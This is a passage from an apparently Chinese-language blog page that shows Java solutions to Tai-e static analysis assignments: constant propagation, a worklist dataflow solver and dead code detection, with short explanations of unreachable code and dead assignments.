punctuation">,</span> <span class="token function">meetValue</span><span class="token punctuation">(</span>fact<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>   <span class="token comment">/** * Meets two Values. */</span><span class="token keyword">public</span> <span class="token class-name">Value</span> <span class="token function">meetValue</span><span class="token punctuation">(</span><span class="token class-name">Value</span> v1<span class="token punctuation">,</span> <span class="token class-name">Value</span> v2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>v1<span class="token punctuation">.</span><span class="token function">isNAC</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> v2<span class="token punctuation">.</span><span class="token function">isNAC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Value</span><span class="token punctuation">.</span><span class="token function">getNAC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>v1<span class="token punctuation">.</span><span class="token function">isUndef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> v2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>v2<span class="token punctuation">.</span><span class="token function">isUndef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> v1<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>v1<span class="token punctuation">.</span><span class="token function">getConstant</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> v2<span class="token punctuation">.</span><span class="token function">getConstant</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Value</span><span class="token punctuation">.</span><span class="token function">makeConstant</span><span class="token punctuation">(</span>v1<span class="token punctuation">.</span><span class="token function">getConstant</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token class-name">Value</span><span class="token punctuation">.</span><span class="token function">getNAC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">transferNode</span><span class="token punctuation">(</span><span class="token class-name">Stmt</span> stmt<span class="token punctuation">,</span> <span class="token class-name">CPFact</span> in<span class="token punctuation">,</span> <span class="token class-name">CPFact</span> out<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>stmt <span class="token keyword">instanceof</span> <span class="token class-name">DefinitionStmt</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">LValue</span> lv <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">DefinitionStmt</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> stmt<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">RValue</span> rv <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">DefinitionStmt</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> stmt<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>lv <span class="token keyword">instanceof</span> <span class="token class-name">Var</span> <span class="token operator">&amp;&amp;</span> <span class="token function">canHoldInt</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Var</span><span class="token punctuation">)</span>lv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">CPFact</span> tf <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            tf<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Var</span><span class="token punctuation">)</span>lv<span class="token punctuation">,</span> <span class="token function">evaluate</span><span class="token punctuation">(</span>rv<span class="token punctuation">,</span> in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> out<span class="token punctuation">.</span><span class="token function">copyFrom</span><span class="token punctuation">(</span>tf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> out<span class="token punctuation">.</span><span class="token function">copyFrom</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>A2/tai-e/src/main/java/pascal/taie/analysis/dataflow/solver/Solver.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">initializeForward</span><span class="token punctuation">(</span><span class="token constant">CFG</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> cfg<span class="token punctuation">,</span> <span class="token class-name">DataflowResult</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Fact</span><span class="token punctuation">></span></span> result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Node</span> entry_node <span class="token operator">=</span> cfg<span class="token punctuation">.</span><span class="token function">getEntry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result<span class="token punctuation">.</span><span class="token function">setOutFact</span><span class="token punctuation">(</span>entry_node<span class="token punctuation">,</span> analysis<span class="token punctuation">.</span><span class="token function">newBoundaryFact</span><span class="token punctuation">(</span>cfg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result<span class="token punctuation">.</span><span class="token function">setInFact</span><span class="token punctuation">(</span>entry_node<span class="token punctuation">,</span> analysis<span class="token punctuation">.</span><span class="token function">newBoundaryFact</span><span class="token punctuation">(</span>cfg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Node</span> node <span class="token operator">:</span> cfg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>cfg<span class="token punctuation">.</span><span class="token function">isEntry</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            result<span class="token punctuation">.</span><span class="token function">setOutFact</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> analysis<span class="token punctuation">.</span><span class="token function">newInitialFact</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            result<span class="token punctuation">.</span><span class="token function">setInFact</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> analysis<span class="token punctuation">.</span><span class="token function">newInitialFact</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span></code></pre></li><li><p><code>A2/tai-e/src/main/java/pascal/taie/analysis/dataflow/solver/WorkListSolver.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doSolveForward</span><span class="token punctuation">(</span><span class="token constant">CFG</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> cfg<span class="token punctuation">,</span> <span class="token class-name">DataflowResult</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Fact</span><span class="token punctuation">></span></span> result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> work_list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayDeque</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token operator">:</span>cfg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        work_list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>work_list<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> node <span class="token operator">=</span> work_list<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Fact</span> out <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getOutFact</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Fact</span> in <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getInFact</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Node</span> pred_node <span class="token operator">:</span> cfg<span class="token punctuation">.</span><span class="token function">getPredsOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            analysis<span class="token punctuation">.</span><span class="token function">meetInto</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">getOutFact</span><span class="token punctuation">(</span>pred_node<span class="token punctuation">)</span><span class="token punctuation">,</span> in<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>analysis<span class="token punctuation">.</span><span class="token function">transferNode</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> in<span class="token punctuation">,</span> out<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Node</span> succ <span class="token operator">:</span> cfg<span class="token punctuation">.</span><span class="token function">getSuccsOf</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>work_list<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>succ<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    work_list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>succ<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><hr /><h3 id="死代码检测">3. 死代码检测</h3><ol type="1"><li><p>组合前两次作业中实现的分析方法：<strong>活跃变量分析</strong>和<strong>常量传播</strong>，来实现一个Java 的死代码检测算法</p></li><li><p>死代码指的是程序中不可达的（unreachable）代码（即不会被执行的代码），或者是执行结果永远不会被其他计算过程用到的代码。去除死代码可以在不影响程序输出的前提下简化程序、提高效率</p><ol type="1"><li><strong>不可达代码</strong>（unreachablecode）和<strong>无用赋值</strong>（dead assignment）</li></ol></li><li><p><strong>控制流不可达代码</strong>（control-flow unreachablecode）和<strong>分支不可达代码</strong>（unreachable branch）</p></li><li><p>控制流不可达的。比如，由于返回语句是一个方法的出口，所以跟在它后面的代码是不可达的。例如在下面的代码中，第4 行和第 5 行的代码是控制流不可达的：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> <span class="token function">controlFlowUnreachable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> x<span class="token punctuation">;</span>    <span class="token keyword">int</span> z <span class="token operator">=</span> <span class="token number">42</span><span class="token punctuation">;</span> <span class="token comment">// control-flow unreachable code</span>    <span class="token function">foo</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// control-flow unreachable code</span><span class="token punctuation">&#125;</span></code></pre><p><strong>检测方式</strong>：这样的代码可以很简单地利用所在方法的控制流图（CFG，即control-flow graph）检测出来。我们只需要从方法入口开始，遍历 CFG并标记可达语句。当遍历结束时，那些没有被标记的语句就是控制流不可达的。</p></li><li><p>有时即使等号左边的变量 <code>x</code>是无用变量，它所属的赋值语句 <code>x = expr</code>也不能被去除，因为右边的表达式 <code>expr</code> 可能带有某些<ahref="https://zh.wikipedia.org/wiki/副作用_(计算机科学)">副作用open innew window</a>。</p></li><li><p>为了简单起见，不需要考虑由删除死代码而产生的新的死代码。</p></li></ol><h4 id="实现-2">实现</h4><ol type="1"><li><p>DeadCodeDetection.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeadCodeDetection</span> <span class="token keyword">extends</span> <span class="token class-name">MethodAnalysis</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">ID</span> <span class="token operator">=</span> <span class="token string">"deadcode"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">DeadCodeDetection</span><span class="token punctuation">(</span><span class="token class-name">AnalysisConfig</span> config<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Stmt</span><span class="token punctuation">></span></span> <span class="token function">analyze</span><span class="token punctuation">(</span><span class="token class-name">IR</span> ir<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// obtain CFG</span>        <span class="token constant">CFG</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Stmt</span><span class="token punctuation">></span></span> cfg <span class="token operator">=</span> ir<span class="token punctuation">.</span><span class="token function">getResult</span><span class="token punctuation">(</span><span class="token class-name">CFGBuilder</span><span class="token punctuation">.</span><span class="token constant">ID</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// obtain result of constant propagation</span>        <span class="token class-name">DataflowResult</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Stmt</span><span class="token punctuation">,</span> <span class="token class-name">CPFact</span><span class="token punctuation">></span></span> constants <span class="token operator">=</span>                ir<span class="token punctuation">.</span><span class="token function">getResult</span><span class="token punctuation">(</span><span class="token class-name">ConstantPropagation</span><span class="token punctuation">.</span><span class="token constant">ID</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// obtain result of live variable analysis</span>        <span class="token class-name">DataflowResult</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Stmt</span><span class="token punctuation">,</span> <span class="token class-name">SetFact</span><span class="token punctuation">&lt;</span><span class="token class-name">Var</span><span class="token punctuation">></span><span class="token punctuation">></span></span> liveVars <span class="token operator">=</span>                ir<span class="token punctuation">.</span><span class="token function">getResult</span><span class="token punctuation">(</span><span class="token class-name">LiveVariableAnalysis</span><span class="token punctuation">.</span><span class="token constant">ID</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// keep statements (dead code) sorted in the resulting set</span>        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Stmt</span><span class="token punctuation">></span></span> deadCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">Comparator</span><span class="token punctuation">.</span><span class="token function">comparing</span><span class="token punctuation">(</span><span class="token class-name">Stmt</span><span class="token operator">::</span><span class="token function">getIndex</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// TODO - finish me</span>        <span class="token comment">// Your task is to recognize dead code in ir and add it to deadCode</span>        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Stmt</span><span class="token punctuation">></span></span> liveCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">Comparator</span><span class="token punctuation">.</span><span class="token function">comparing</span><span class="token punctuation">(</span><span class="token class-name">Stmt</span><span class="token operator">::</span><span class="token function">getIndex</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Stmt</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cfg<span class="token punctuation">.</span><span class="token function">getEntry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Stmt</span> stmt <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>stmt <span class="token keyword">instanceof</span> <span class="token class-name">AssignStmt</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">></span></span> s <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">.</span><span class="token function">getLValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">Var</span> <span class="token keyword">var</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>liveVars<span class="token punctuation">.</span><span class="token function">getResult</span><span class="token punctuation">(</span>stmt<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token keyword">var</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">hasNoSideEffect</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">getRValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    queue<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>cfg<span class="token punctuation">.</span><span class="token function">getSuccsOf</span><span class="token punctuation">(</span>stmt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// 如果添加返回false,说明该语句已经存在于liveCode中了</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>liveCode<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>stmt<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>stmt <span class="token keyword">instanceof</span> <span class="token class-name">If</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Value</span> res <span class="token operator">=</span> <span class="token class-name">ConstantPropagation</span><span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">getCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> constants<span class="token punctuation">.</span><span class="token function">getInFact</span><span class="token punctuation">(</span>stmt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token function">isConstant</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Edge</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Stmt</span><span class="token punctuation">></span></span> edge <span class="token operator">:</span> cfg<span class="token punctuation">.</span><span class="token function">getOutEdgesOf</span><span class="token punctuation">(</span>stmt<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token function">getConstant</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> edge<span class="token punctuation">.</span><span class="token function">getKind</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">Edge<span class="token punctuation">.</span>Kind</span><span class="token punctuation">.</span><span class="token constant">IF_TRUE</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token function">getConstant</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> edge<span class="token punctuation">.</span><span class="token function">getKind</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">Edge<span class="token punctuation">.</span>Kind</span><span class="token punctuation">.</span><span class="token constant">IF_FALSE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>edge<span class="token punctuation">.</span><span class="token function">getTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    queue<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>cfg<span class="token punctuation">.</span><span class="token function">getSuccsOf</span><span class="token punctuation">(</span>stmt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>stmt <span class="token keyword">instanceof</span> <span class="token class-name">SwitchStmt</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Value</span> res <span class="token operator">=</span> <span class="token class-name">ConstantPropagation</span><span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">getVar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> constants<span class="token punctuation">.</span><span class="token function">getInFact</span><span class="token punctuation">(</span>stmt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token function">isConstant</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">AtomicBoolean</span> gone <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicBoolean</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    s<span class="token punctuation">.</span><span class="token function">getCaseTargets</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>cse <span class="token operator">-></span> cse<span class="token punctuation">.</span><span class="token function">first</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> res<span class="token punctuation">.</span><span class="token function">getConstant</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>cse <span class="token operator">-></span> <span class="token punctuation">&#123;</span>                        gone<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cse<span class="token punctuation">.</span><span class="token function">second</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>gone<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">getDefaultTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    queue<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>cfg<span class="token punctuation">.</span><span class="token function">getSuccsOf</span><span class="token punctuation">(</span>stmt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                queue<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>cfg<span class="token punctuation">.</span><span class="token function">getSuccsOf</span><span class="token punctuation">(</span>stmt<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        deadCode<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>cfg<span class="token punctuation">.</span><span class="token function">getNodes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        deadCode<span class="token punctuation">.</span><span class="token function">removeAll</span><span class="token punctuation">(</span>liveCode<span class="token punctuation">)</span><span class="token punctuation">;</span>        deadCode<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>cfg<span class="token punctuation">.</span><span class="token function">getExit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> deadCode<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="类层次结构分析和过程间常量传播">4.类层次结构分析和过程间常量传播</h3><h4 id="目的">目的</h4><ol type="1"><li>实现一个基于类层次结构（下面简称为<code>CHA</code>）的调用图（<code>call graph</code>）构造器</li><li>还需要实现一个<code>worklist 求解器</code>来支持过程间数据流分析</li></ol><h4 id="实现类层次结构分析cha">实现类层次结构分析（CHA）</h4><ol 